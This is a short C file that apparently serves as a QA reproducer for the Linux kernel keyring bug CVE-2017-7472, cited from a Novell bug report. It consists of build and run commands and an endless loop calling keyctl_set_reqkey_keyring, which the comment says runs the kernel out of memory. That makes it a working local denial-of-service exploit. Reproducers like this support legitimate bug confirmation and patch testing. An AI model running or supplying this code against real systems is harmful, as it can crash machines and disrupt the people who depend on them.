/*
Source: https://bugzilla.novell.com/show_bug.cgi?id=1034862
QA REPRODUCER:

gcc -O2 -o CVE-2017-7472 CVE-2017-7472.c -lkeyutils
./CVE-2017-7472

(will run the kernel out of memory)
*/
#include <sys/types.h>
#include <keyutils.h>

int main()
{
	for (;;)
		keyctl_set_reqkey_keyring(KEY_REQKEY_DEFL_THREAD_KEYRING);
}